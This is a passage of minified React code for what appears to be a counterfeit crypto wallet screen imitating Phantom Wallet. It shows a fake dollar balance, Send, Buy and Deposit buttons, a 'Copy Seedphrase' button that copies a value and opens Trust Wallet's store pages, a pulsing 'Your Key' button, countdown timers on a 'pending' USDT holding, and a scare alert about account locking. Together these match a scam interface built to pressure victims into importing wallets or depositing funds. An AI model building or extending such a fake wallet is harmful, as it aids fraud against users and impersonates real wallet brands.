                                                    lineHeight: "1.6"
                                                },
                                                children: e
                                            })]
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                display: "flex",
                                                gap: "12px",
                                                width: "100%",
                                                marginBottom: "16px"
                                            },
                                            children: [(0, r.jsxs)("a", {
                                                href: "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
                                                target: "_blank",
                                                rel: "noopener noreferrer",
                                                style: {
                                                    flex: 1,
                                                    textDecoration: "none",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    padding: "10px 12px",
                                                    backgroundColor: "#0f0f0f",
                                                    borderRadius: "20px",
                                                    border: "1px solid #2a2a2a",
                                                    transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                    gap: "8px"
                                                },
                                                onMouseEnter: e => {
                                                    e.currentTarget.style.backgroundColor = "rgba(255,255,255,0.86)", e.currentTarget.style.borderColor = "#8B5CF6", e.currentTarget.style.transform = "scale(1.02)"
                                                },
                                                onMouseLeave: e => {
                                                    e.currentTarget.style.backgroundColor = "#0f0f0f", e.currentTarget.style.borderColor = "#2a2a2a", e.currentTarget.style.transform = "scale(1)"
                                                },
                                                children: [(0, r.jsxs)("svg", {
                                                    width: "24",
                                                    height: "24",
                                                    viewBox: "0 0 24 24",
                                                    children: [(0, r.jsx)("path", {
                                                        d: "M3.15 2.87L12.82 12.5L3.15 22.13C2.99 21.96 2.85 21.77 2.74 21.56C2.35 20.86 2.35 19.98 2.35 19.23V4.77C2.35 4.02 2.35 3.14 2.74 2.44C2.85 2.23 2.99 2.04 3.15 2.87Z",
                                                        fill: "#34A853"
                                                    }), (0, r.jsx)("path", {
                                                        d: "M4.75 22.99C4.55 22.84 4.37 22.67 4.21 22.49L12.77 13.93L15.49 16.65L4.75 22.99Z",
                                                        fill: "#EA4335"
                                                    }), (0, r.jsx)("path", {
                                                        d: "M4.21 1.51C4.37 1.33 4.55 1.16 4.75 1.01L15.49 7.35L12.77 10.07L4.21 1.51Z",
                                                        fill: "#4285F4"
                                                    }), (0, r.jsx)("path", {
                                                        d: "M16.12 8.58L13.75 10.95L11.86 9.06L16.12 8.58Z",
                                                        fill: "#FBBC04"
                                                    }), (0, r.jsx)("path", {
                                                        d: "M11.86 14.94L13.75 13.05L16.12 15.42L11.86 14.94Z",
                                                        fill: "#FBBC04"
                                                    }), (0, r.jsx)("path", {
                                                        d: "M16.12 8.58L19.35 10.3C20.12 10.72 21.06 11.42 21.06 12.5C21.06 13.58 20.12 14.28 19.35 14.7L16.12 15.42L12.77 13.93L11.86 12.5L12.77 11.07L16.12 8.58Z",
                                                        fill: "#34A853"
                                                    })]
                                                }), (0, r.jsx)("span", {
                                                    style: {
                                                        color: "#FFFFFF",
                                                        fontSize: "14px",
                                                        fontWeight: 600
                                                    },
                                                    children: "Google Play"
                                                })]
                                            }), (0, r.jsx)("a", {
                                                href: "https://apps.apple.com/app/trust-crypto-wallet/id1288339409",
                                                target: "_blank",
                                                rel: "noopener noreferrer",
                                                style: {
                                                    flex: 1,
                                                    textDecoration: "none",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    padding: "10px 12px",
                                                    backgroundColor: "#0f0f0f",
                                                    borderRadius: "20px",
                                                    border: "1px solid #2a2a2a",
                                                    transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                    gap: "8px"
                                                },
                                                onMouseEnter: e => {
                                                    e.currentTarget.style.backgroundColor = "rgba(255,255,255,0.86)", e.currentTarget.style.borderColor = "#8B5CF6", e.currentTarget.style.transform = "scale(1.02)"
                                                },
                                                onMouseLeave: e => {
                                                    e.currentTarget.style.backgroundColor = "#0f0f0f", e.currentTarget.style.borderColor = "#2a2a2a", e.currentTarget.style.transform = "scale(1)"
                                                },
                                                children: (0, r.jsx)("img", {
                                                    src: "https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg",
                                                    alt: "App Store",
                                                    style: {
                                                        height: "32px",
                                                        width: "auto",
                                                        objectFit: "contain"
                                                    }
                                                })
                                            })]
                                        }), (0, r.jsx)("div", {
                                            style: {
                                                display: "flex",
                                                gap: "12px",
                                                width: "100%",
                                                marginTop: "auto"
                                            },
                                            children: (0, r.jsxs)("button", {
                                                onClick: () => {
                                                    navigator.clipboard.writeText(e), ei(!0), setTimeout(() => ei(!1), 2e3);
                                                    let t = /Android/i.test(navigator.userAgent),
                                                        n = /iPhone|iPad|iPod/i.test(navigator.userAgent);
                                                    t ? window.open("https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp", "_blank") : n ? window.open("https://apps.apple.com/app/trust-crypto-wallet/id1288339409", "_blank") : confirm("Open Google Play Store for Android or App Store for iOS?") && window.open("https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp", "_blank")
                                                },
                                                style: {
                                                    width: "100%",
                                                    padding: "14px",
                                                            color: "#fff",
                                                    border: "none",
                                                    borderRadius: "999px",
                                                    fontSize: "14px",
                                                    fontWeight: 700,
                                                    cursor: "pointer",
                                                    transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    gap: "8px"
                                                },
                                                onMouseEnter: e => {
                                                    e.currentTarget.style.filter = "brightness(1.03)", e.currentTarget.style.transform = "scale(1.02)"
                                                },
                                                onMouseLeave: e => {
                                                    e.currentTarget.style.filter = "brightness(1)", e.currentTarget.style.transform = "scale(1)"
                                                },
                                                children: [(0, r.jsx)("svg", {
                                                    width: "18",
                                                    height: "18",
                                                    viewBox: "0 0 24 24",
                                                    fill: "#fff",
                                                    children: (0, r.jsx)("path", {
                                                        d: "M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"
                                                    })
                                                }), eo ? "✓ Copied!" : "Copy Seedphrase"]
                                            })
                                        })]
                                    })]
                                })
                            })()
                        }), (0, r.jsxs)("div", {
                            style: {
                                display: "flex",
                                flexDirection: "column",
                                flex: 1,
                                width: "100%",
                                maxWidth: "428px",
                                margin: "0 auto",
                                padding: "8px 8px 0"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: [(0, r.jsxs)("div", {
                                style: {
                                    display: "flex",
                                    justifyContent: "space-between",
                                    alignItems: "center",
                                    padding: "12px 2px"
                                },
                                className: "jsx-212d2f498bea9fe5",
                                children: [(0, r.jsx)("div", {
                                    className: "jsx-212d2f498bea9fe5",
                                    children: (0, r.jsxs)("button", {
                                        style: {
                                            background: "rgba(255,255,255,0.55)",
                                            border: "none",
                                            cursor: "pointer",
                                            outline: "none",
                                            padding: 0,
                                            display: "flex",
                                            alignItems: "center"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: [(0, r.jsx)("div", {
                                            style: {
                                                width: "40px",
                                                height: "40px",
                                                display: "flex",
                                                alignItems: "center",
                                                justifyContent: "center"
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: (0, r.jsx)("img", {
                                                src: "data:image/svg+xml;utf8,%3Csvg%20width%3D%22128%22%20height%3D%22128%22%20viewBox%3D%220%200%20128%20128%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%22128%22%20height%3D%22128%22%20fill%3D%22%23AB9FF2%22%2F%3E%0A%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M55.6416%2082.1477C50.8744%2089.4525%2042.8862%2098.6966%2032.2568%2098.6966C27.232%2098.6966%2022.4004%2096.628%2022.4004%2087.6424C22.4004%2064.7584%2053.6445%2029.3335%2082.6339%2029.3335C99.1257%2029.3335%20105.697%2040.7755%20105.697%2053.7689C105.697%2070.4471%2094.8739%2089.5171%2084.1156%2089.5171C80.7013%2089.5171%2079.0264%2087.6424%2079.0264%2084.6688C79.0264%2083.8931%2079.1552%2083.0527%2079.4129%2082.1477C75.7409%2088.4182%2068.6546%2094.2361%2062.0192%2094.2361C57.1877%2094.2361%2054.7397%2091.1979%2054.7397%2086.9314C54.7397%2085.3799%2055.0618%2083.7638%2055.6416%2082.1477ZM80.6133%2053.3182C80.6133%2057.1044%2078.3795%2058.9975%2075.8806%2058.9975C73.3438%2058.9975%2071.1479%2057.1044%2071.1479%2053.3182C71.1479%2049.532%2073.3438%2047.6389%2075.8806%2047.6389C78.3795%2047.6389%2080.6133%2049.532%2080.6133%2053.3182ZM94.8102%2053.3184C94.8102%2057.1046%2092.5763%2058.9977%2090.0775%2058.9977C87.5407%2058.9977%2085.3447%2057.1046%2085.3447%2053.3184C85.3447%2049.5323%2087.5407%2047.6392%2090.0775%2047.6392C92.5763%2047.6392%2094.8102%2049.5323%2094.8102%2053.3184Z%22%20fill%3D%22%23FFFDF8%22%2F%3E%0A%3C%2Fsvg%3E%0A",
                                                alt: "Phantom Wallet",
                                                style: {
                                                    width: "26px",
                                                    height: "26px",
                                                    borderRadius: "18px",
                                                    objectFit: "contain"
                                                },
                                                className: "jsx-212d2f498bea9fe5"
                                            })
                                        }), (0, r.jsx)("div", {
                                            style: {
                                                paddingLeft: "8px"
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: (0, r.jsx)("p", {
                                                style: {
                                                    fontSize: "16px",
                                                    lineHeight: "24px",
                                                    color: tH("--twc-textPrimary"),
                                                    fontWeight: 500,
                                                    margin: 0
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: "Main Wallet"
                                            })
                                        }), (0, r.jsx)("svg", {
                                            style: {
                                                color: tH("--twc-iconNormal"),
                                                marginLeft: "4px"
                                            },
                                            fill: "none",
                                            width: "20",
                                            height: "20",
                                            viewBox: "0 0 24 24",
                                            className: "jsx-212d2f498bea9fe5",
                                            children: (0, r.jsx)("path", {
                                                d: "M16.5 8.49023V10.74023L12 15.51023L7.5 10.74023V8.49023H16.5Z",
                                                fill: "currentColor",
                                                className: "jsx-212d2f498bea9fe5"
                                            })
                                        })]
                                    })
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        alignItems: "center",
                                        gap: "6px",
                                        padding: "6px 10px",
                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                        borderRadius: "20px",
                                        border: "1px solid rgba(174,156,255,0.18)"
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [(0, r.jsx)("svg", {
                                        width: "14",
                                        height: "14",
                                        viewBox: "0 0 24 24",
                                        fill: tH("--twc-primary"),
                                        className: "jsx-212d2f498bea9fe5",
                                        children: (0, r.jsx)("path", {
                                            d: "M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z",
                                            className: "jsx-212d2f498bea9fe5"
                                        })
                                    }), (0, r.jsx)("span", {
                                        style: {
                                            color: tH("--twc-primary"),
                                            fontSize: "12px",
                                            fontWeight: 600
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: "Secure"
                                    })]
                                })]
                            }), (0, r.jsxs)("div", {
                                style: {
                                    paddingBottom: "12px"
                                },
                                className: "jsx-212d2f498bea9fe5",
                                children: [(0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        alignItems: "center",
                                        gap: "12px",
                                        marginBottom: "16px"
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [(0, r.jsxs)("h2", {
                                        style: {
                                            fontSize: "28px",
                                            lineHeight: "36px",
                                            color: tH("--twc-textPrimary"),
                                            fontWeight: 600,
                                            margin: 0
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: ["$", es.toLocaleString("en-US", {
                                            minimumFractionDigits: 2,
                                            maximumFractionDigits: 2
                                        })]
                                    }), (0, r.jsx)("button", {
                                        onClick: () => {
                                            ep(!0), setTimeout(() => {
                                                ep(!1)
                                            }, 1e3)
                                        },
                                        style: {
                                            background: "rgba(255,255,255,0.55)",
                                            border: "none",
                                            borderRadius: "50%",
                                            padding: "10px",
                                            cursor: "pointer",
                                            outline: "none"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: (0, r.jsx)("svg", {
                                            style: {
                                                color: tH("--twc-iconNormal"),
                                                transform: "scaleX(-1)",
                                                transition: "transform 0.5s",
                                                animation: ed ? "spin 1s linear infinite" : "none"
                                            },
                                            fill: "none",
                                            width: "18",
                                            height: "18",
                                            viewBox: "0 0 20 20",
                                            className: "jsx-212d2f498bea9fe5",
                                            children: (0, r.jsx)("path", {
                                                fillRule: "evenodd",
                                                clipRule: "evenodd",
                                                d: "M16.6631 10.1751C16.6646 10.1169 16.6654 10.0585 16.6654 9.99992C16.6654 9.94134 16.6646 9.88294 16.6631 9.82472V10.1751ZM12.944 12.9475L10.7705 10.774H16.6631V16.6666L14.7116 14.7151C13.5053 15.9209 11.8391 16.6666 9.9987 16.6666C6.89226 16.6666 4.28207 14.5419 3.54203 11.6665H6.1791C6.82204 13.1381 8.29047 14.1666 9.9991 14.1666C11.149 14.1666 12.1901 13.7008 12.944 12.9475ZM16.4553 8.33325C15.7153 5.45787 13.1051 3.33325 9.9987 3.33325C8.15802 3.33325 6.49156 4.07923 5.28518 5.28535L3.33308 3.33325V9.22581H9.22564L7.05315 7.05332C7.80714 6.29949 8.84867 5.83325 9.9991 5.83325C11.7077 5.83325 13.1761 6.86166 13.8191 8.33325H16.4553ZM3.33203 9.99992C3.33203 9.95686 3.33244 9.91391 3.33325 9.87105V10.1288C3.33244 10.0859 3.33203 10.043 3.33203 9.99992Z",
                                                fill: "currentColor",
                                                className: "jsx-212d2f498bea9fe5"
                                            })
                                        })
                                    })]
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        justifyContent: "space-between",
                                        padding: "0 16px"
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [
                                        [{
                                            name: "Send",
                                            icon: "M10.002 2.49903L15.8945 8.39158L14.4214 9.86472L11.0426 6.48597L11.0426 17.4998L8.95931 17.4998L8.95931 6.48697L5.58156 9.86472L4.10842 8.39158L10.001 2.49903L10.0015 2.49953L10.002 2.49903Z",
                                            onClick: () => {
                                                if (tr.length > 0) return void alert("⚠️ Transaction pending - further attempts may lock your account after 3 failures!");
                                                eI(!0), setTimeout(() => {
                                                    eI(!1), ef(!0), eR("select"), eb(""), ej(""), eS(""), ek(!1), eP(""), J(!1), et(null)
                                                }, 300)
                                            }
                                        }, {
                                            name: "Buy",
                                            icon: "M21 5H3V8H21V5ZM21 10.5H3V19H21V10.5ZM6 13H11V15.5H6V13ZM15.5 13H13V15.5H15.5V13Z",
                                            viewBox: "0 0 24 24",
                                            onClick: () => {
                                                X(!0), setTimeout(() => {
                                                    X(!1), K(!0)
                                                }, 300)
                                            }
                                        }, {
                                            name: "Deposit",
                                            icon: "M9.99803 17.4993L4.10547 11.6067L5.57861 10.1336L8.95736 13.5123L8.95736 2.49845L11.0407 2.49845L11.0407 13.5113L14.4184 10.1336L15.8916 11.6067L9.99902 17.4993L9.99852 17.4988L9.99803 17.4993Z",
                                            onClick: () => {
                                                eV(!0), setTimeout(() => {
                                                    eV(!1), eA(!0), eZ("select"), eW("USDT"), eK(""), Q(!1), et(null)
                                                }, 300)
                                            }
                                        }].map((e, t) => (0, r.jsxs)("div", {
                                            style: {
                                                display: "flex",
                                                flexDirection: "column",
                                                alignItems: "center",
                                                gap: "8px",
                                                width: "60px"
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: [(0, r.jsx)("button", {
                                                onClick: e.onClick,
                                                style: {
                                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                    color: tH("--twc-textPrimary"),
                                                    borderRadius: "50%",
                                                    width: "52px",
                                                    height: "52px",
                                                    border: "none",
                                                    cursor: "pointer",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    position: "relative",
                                                    transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                    boxShadow: "0 2px 8px rgba(0,0,0,0.2)"
                                                },
                                                onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                                onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                                className: "jsx-212d2f498bea9fe5",
                                                children: (0, r.jsx)("svg", {
                                                    style: {
                                                        color: tH("--twc-textPrimary")
                                                    },
                                                    fill: "none",
                                                    width: "18",
                                                    height: "18",
                                                    viewBox: e.viewBox || "0 0 20 20",
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: (0, r.jsx)("path", {
                                                        fillRule: "evenodd",
                                                        clipRule: "evenodd",
                                                        d: e.icon,
                                                        fill: "currentColor",
                                                        className: "jsx-212d2f498bea9fe5"
                                                    })
                                                })
                                            }), (0, r.jsx)("p", {
                                                style: {
                                                    fontSize: "13px",
                                                    color: tH("--twc-textPrimary"),
                                                    fontWeight: 500,
                                                    margin: 0,
                                                    textAlign: "center"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: e.name
                                            })]
                                        }, t)), (0, r.jsxs)("div", {
                                            style: {
                                                display: "flex",
                                                flexDirection: "column",
                                                alignItems: "center",
                                                gap: "8px",
                                                width: "60px"
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: [(0, r.jsx)("button", {
                                                onClick: () => {
                                                    Z(!0), setTimeout(() => {
                                                        Z(!1), er(!0)
                                                    }, 1e3)
                                                },
                                                style: {
                                                    backgroundColor: "#ff4444",
                                                    borderRadius: "50%",
                                                    width: "52px",
                                                    height: "52px",
                                                    border: "none",
                                                    cursor: "pointer",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                    boxShadow: "0 0 12px rgba(255,68,68,0.6)",
                                                    animation: "pulse 1.5s infinite"
                                                },
                                                onMouseEnter: e => e.currentTarget.style.backgroundColor = "#ff6666",
                                                onMouseLeave: e => e.currentTarget.style.backgroundColor = "#ff4444",
                                                className: "jsx-212d2f498bea9fe5",
                                                children: (0, r.jsx)("svg", {
                                                    width: "22",
                                                    height: "22",
                                                    viewBox: "0 0 24 24",
                                                    fill: "none",
                                                    stroke: "white",
                                                    strokeWidth: "2",
                                                    strokeLinecap: "round",
                                                    strokeLinejoin: "round",
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: (0, r.jsx)("path", {
                                                        d: "M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4",
                                                        className: "jsx-212d2f498bea9fe5"
                                                    })
                                                })
                                            }), (0, r.jsx)("p", {
                                                style: {
                                                    fontSize: "13px",
                                                    color: tH("--twc-textPrimary"),
                                                    fontWeight: 500,
                                                    margin: 0,
                                                    textAlign: "center"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: "Your Key"
                                            })]
                                        })
                                    ]
                                })]
                            }), (0, r.jsx)("div", {
                                style: {
                                    display: "flex",
                                    justifyContent: "center",
                                    borderBottom: "1px solid ".concat(tH("--twc-line"))
                                },
                                className: "jsx-212d2f498bea9fe5",
                                children: (0, r.jsxs)("button", {
                                    style: {
                                        padding: "0 8px 8px",
                                        background: "rgba(255,255,255,0.55)",
                                        border: "none",
                                        cursor: "pointer",
                                        outline: "none"
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [(0, r.jsx)("p", {
                                        style: {
                                            fontSize: "16px",
                                            color: tH("--twc-textPrimary"),
                                            fontWeight: 500,
                                            margin: 0,
                                            marginBottom: "8px"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: "Crypto"
                                    }), (0, r.jsx)("div", {
                                        style: {
                                            width: "24px",
                                            height: "4px",
                                            margin: "0 auto",
                                            borderRadius: "2px"
                                        },
                                        className: "jsx-212d2f498bea9fe5"
                                    })]
                                })
                            }), (0, r.jsxs)("div", {
                                style: {
                                    flex: 1,
                                    overflowY: "auto",
                                    paddingTop: "8px",
                                    paddingBottom: "80px",
                                    WebkitOverflowScrolling: "touch"
                                },
                                className: "jsx-212d2f498bea9fe5",
                                children: [(0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        justifyContent: "space-between",
                                        alignItems: "center",
                                        padding: "14px 0",
                                        cursor: (t_("USDT"), "pointer")
                                    },
                                    onClick: () => t_("USDT") ? tM("USDT") : null,
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [(0, r.jsxs)("div", {
                                        style: {
                                            display: "flex",
                                            alignItems: "center",
                                            gap: "12px",
                                            flex: 1
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: [(0, r.jsxs)("div", {
                                            style: {
                                                position: "relative"
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    width: "40px",
                                                    height: "40px",
                                                    position: "relative"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: [(0, r.jsx)("img", {
                                                    alt: "Tether USD",
                                                    src: tC.USDT,
                                                    style: {
                                                        width: "100%",
                                                        borderRadius: "50%",
                                                        opacity: t_("USDT") ? .7 : 1
                                                    },
                                                    className: "jsx-212d2f498bea9fe5"
                                                }), t_("USDT") && (0, r.jsx)("div", {
                                                    style: {
                                                        position: "absolute",
                                                        top: "-4px",
                                                        right: "-4px",
                                                        width: "20px",
                                                        height: "20px",
                                                        borderRadius: "50%",
                                                        backgroundColor: "#ff4444",
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        animation: "pulse 2s infinite",
                                                        border: "2px solid " + tH("--twc-backgroundPrimary"),
                                                        boxShadow: "0 0 10px rgba(255, 68, 68, 0.5)",
                                                        zIndex: 10
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: (0, r.jsx)("svg", {
                                                        width: "10",
                                                        height: "10",
                                                        viewBox: "0 0 24 24",
                                                        fill: "white",
                                                        className: "jsx-212d2f498bea9fe5",
                                                        children: (0, r.jsx)("path", {
                                                            d: "M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z",
                                                            className: "jsx-212d2f498bea9fe5"
                                                        })
                                                    })
                                                })]
                                            }), (0, r.jsx)("div", {
                                                style: {
                                                    position: "absolute",
                                                    bottom: "-2px",
                                                    right: "-2px",
                                                    width: "16px",
                                                    height: "16px",
                                                    borderRadius: "50%",
                                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                    border: "2px solid ".concat(tH("--twc-backgroundPrimary")),
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    zIndex: 5
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: (0, r.jsx)("img", {
                                                    alt: "TRON",
                                                    src: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png",
                                                    style: {
                                                        width: "100%",
                                                        borderRadius: "50%"
                                                    },
                                                    className: "jsx-212d2f498bea9fe5"
                                                })
                                            })]
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                flex: 1
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    display: "flex",
                                                    alignItems: "center",
                                                    gap: "6px",
                                                    marginBottom: "4px",
                                                    flexWrap: "wrap"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: [(0, r.jsx)("p", {
                                                    style: {
                                                        fontSize: "16px",
                                                        color: tH("--twc-textPrimary"),
                                                        fontWeight: 600,
                                                        margin: 0
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: "USDT"
                                                }), (0, r.jsx)("span", {
                                                    style: {
                                                        fontSize: "11px",
                                                        padding: "3px 6px",
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        color: tH("--twc-textThird"),
                                                        borderRadius: "4px",
                                                        fontWeight: 500
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: "TRC20"
                                                }), t_("USDT") && (() => {
                                                    let e = tP("USDT")[0],
                                                        t = (null == e ? void 0 : e.timerEnd) ? tE(e.timerEnd) : null;
                                                    return (0, r.jsxs)("div", {
                                                        style: {
                                                            display: "flex",
                                                            alignItems: "center",
                                                            gap: "4px"
                                                        },
                                                        className: "jsx-212d2f498bea9fe5",
                                                        children: [(0, r.jsx)("span", {
                                                            style: {
                                                                fontSize: "11px",
                                                                color: "#8B5CF6",
                                                                fontWeight: 600,
                                                                backgroundColor: "rgba(76,175,80,0.1)",
                                                                padding: "2px 6px",
                                                                borderRadius: "4px"
                                                            },
                                                            className: "jsx-212d2f498bea9fe5",
                                                            children: "Active"
                                                        }), (0, r.jsx)("div", {
                                                            style: {
                                                                width: "14px",
                                                                height: "14px",
                                                                animation: "spin 2s linear infinite",
                                                                display: "flex",
                                                                alignItems: "center",
                                                                justifyContent: "center"
                                                            },
                                                            className: "jsx-212d2f498bea9fe5",
                                                            children: (0, r.jsx)("svg", {
                                                                width: "14",
                                                                height: "14",
                                                                viewBox: "0 0 24 24",
                                                                className: "jsx-212d2f498bea9fe5",
                                                                children: (0, r.jsx)("circle", {
                                                                    cx: "12",
                                                                    cy: "12",
                                                                    r: "10",
                                                                    stroke: "#FF9800",
                                                                    strokeWidth: "2",
                                                                    strokeDasharray: "20, 10",
                                                                    fill: "none",
                                                                    strokeLinecap: "round",
                                                                    className: "jsx-212d2f498bea9fe5"
                                                                })
                                                            })
                                                        }), t && (0, r.jsxs)("span", {
                                                            style: {
                                                                fontSize: "12px",
                                                                color: t.isUrgent ? "#ff4444" : "#FF9800",
                                                                fontWeight: 600,
                                                                fontFamily: "monospace"
                                                            },
                                                            className: "jsx-212d2f498bea9fe5",
                                                            children: [t.minutes, ":", t.seconds]
                                                        })]
                                                    })
                                                })(), !t_("USDT") && (0, r.jsx)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "4px"
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: (0, r.jsx)("span", {
                                                        style: {
                                                            fontSize: "10px",
                                                            color: "#8B5CF6",
                                                            fontWeight: 600,
                                                            backgroundColor: "rgba(76,175,80,0.1)",
                                                            padding: "2px 6px",
                                                            borderRadius: "4px"
                                                        },
                                                        className: "jsx-212d2f498bea9fe5",
                                                        children: "Active"
                                                    })
                                                })]
                                            }), (0, r.jsxs)("div", {
                                                style: {
                                                    display: "flex",
                                                    alignItems: "center",
                                                    gap: "6px"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: [(0, r.jsxs)("small", {
                                                    style: {
                                                        fontSize: "13px",
                                                        color: tH("--twc-textSecondary"),
                                                        fontWeight: 500
                                                    },
                                                    id: "usdt-price",
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: ["$", tb.USDT.toFixed(2)]
                                                }), (0, r.jsxs)("small", {
                                                    style: {
                                                        fontSize: "13px",
                                                        color: tj.USDT < 0 ? "#ff4444" : "#8B5CF6",
                                                        fontWeight: 500
                                                    },
                                                    id: "usdt-change",
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: [tj.USDT >= 0 ? "+" : "", tj.USDT.toFixed(2), "%"]
                                                }), t_("USDT") && (0, r.jsxs)("small", {
                                                    style: {
                                                        fontSize: "13px",
                                                        color: "#ff4444",
                                                        fontWeight: 700,
                                                        marginLeft: "8px"
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: ["-", tm("USDT").toFixed(2)]
                                                })]
                                            })]
                                        })]
                                    }), (0, r.jsxs)("div", {
                                        style: {
                                            textAlign: "right"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: [(0, r.jsx)("p", {
                                            style: {
                                                fontSize: "16px",
                                                color: tH("--twc-textPrimary"),
                                                fontWeight: 600,
                                                margin: 0,
                                                marginBottom: "4px"
                                            },
                                            className: "jsx-212d2f498bea9fe5",
